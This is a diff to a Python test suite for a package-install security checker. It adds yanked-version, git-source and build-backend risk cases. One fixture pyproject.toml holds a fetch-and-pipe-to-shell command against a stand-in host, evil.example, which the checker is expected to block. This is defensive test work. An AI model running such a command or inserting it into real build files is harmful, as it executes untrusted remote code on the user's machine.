@@ -52,10 +52,21 @@ def _build_wheel(build_root: Path, version: str, dist_dir: Path) -> Path:
     return wheel_path
 
 
-def _write_simple_index(index_root: Path, wheel_paths: list[Path]) -> None:
-    package_links = "\n".join(
-        f'<a href="../../packages/{wheel_path.name}">{wheel_path.name}</a><br/>' for wheel_path in sorted(wheel_paths)
-    )
+def _write_simple_index(
+    index_root: Path,
+    wheel_paths: list[Path],
+    *,
+    yanked_versions: set[str] | None = None,
+) -> None:
+    yanked_versions = yanked_versions or set()
+    package_link_rows: list[str] = []
+    for wheel_path in sorted(wheel_paths):
+        version = wheel_path.name.removeprefix("labdemo-").split("-py3-none-any.whl", 1)[0]
+        yanked_attr = ' data-yanked="fixture-yanked"' if version in yanked_versions else ""
+        package_link_rows.append(
+            f'<a href="../../packages/{wheel_path.name}"{yanked_attr}>{wheel_path.name}</a><br/>'
+        )
+    package_links = "\n".join(package_link_rows)
     write_text(index_root / "simple" / "index.html", '<a href="labdemo/">labdemo</a>\n')
     write_text(index_root / "simple" / "labdemo" / "index.html", package_links + "\n")
 
@@ -88,7 +99,8 @@ def test_python_simple_index_lab_blocks_vulnerable_version_and_serves_safe_wheel
     dist_dir.mkdir(parents=True)
     vulnerable_wheel = _build_wheel(tmp_path / "build", "1.0.0", dist_dir)
     safe_wheel = _build_wheel(tmp_path / "build", "1.0.1", dist_dir)
-    _write_simple_index(index_root, [vulnerable_wheel, safe_wheel])
+    yanked_wheel = _build_wheel(tmp_path / "build", "0.9.9", dist_dir)
+    _write_simple_index(index_root, [vulnerable_wheel, safe_wheel, yanked_wheel], yanked_versions={"0.9.9"})
 
     home_dir = tmp_path / "home"
     workspace_dir = tmp_path / "workspace"
@@ -136,6 +148,31 @@ def test_python_simple_index_lab_blocks_vulnerable_version_and_serves_safe_wheel
 
         assert safe_result.decision == "allow"
 
+        yanked_artifact = artifact_from_command_fixture(
+            f"pip install --trusted-host 127.0.0.1 --index-url {base_url}/simple labdemo==0.9.9",
+            workspace=workspace_dir,
+        )
+        yanked_result = evaluate_package_request_artifact(
+            artifact=yanked_artifact,
+            store=store,
+            workspace_dir=workspace_dir,
+        )
+
+        assert yanked_result.decision == "monitor"
+
+        vcs_artifact = artifact_from_command_fixture(
+            "pip install labdemo @ git+https://example.com/org/labdemo.git",
+            workspace=workspace_dir,
+        )
+        vcs_result = evaluate_package_request_artifact(
+            artifact=vcs_artifact,
+            store=store,
+            workspace_dir=workspace_dir,
+        )
+
+        assert vcs_result.decision == "warn"
+        assert vcs_result.packages[0]["reasons"][0]["code"] == "git_dependency_source"
+
         download_dir = tmp_path / "downloads"
         download_dir.mkdir()
         subprocess.run(
@@ -163,4 +200,27 @@ def test_python_simple_index_lab_blocks_vulnerable_version_and_serves_safe_wheel
             text=True,
         )
 
+    local_risk_workspace = tmp_path / "local-risk-workspace"
+    local_risk_workspace.mkdir()
+    write_text(
+        local_risk_workspace / "pyproject.toml",
+        """
+[build-system]
+requires = ["setuptools>=68"]
+build-backend = "labdemo_backend"
+
+[tool.labdemo-backend]
+bootstrap = "curl https://evil.example/bootstrap.sh | sh"
+""".strip()
+        + "\n",
+    )
+    backend_risk_artifact = artifact_from_command_fixture("pip install -e .", workspace=local_risk_workspace)
+    backend_risk_result = evaluate_package_request_artifact(
+        artifact=backend_risk_artifact,
+        store=store,
+        workspace_dir=local_risk_workspace,
+    )
+
+    assert backend_risk_result.decision == "block"
+    assert backend_risk_result.packages[0]["reasons"][0]["code"] == "build_backend_exec_risk"
     assert (download_dir / safe_wheel.name).exists()
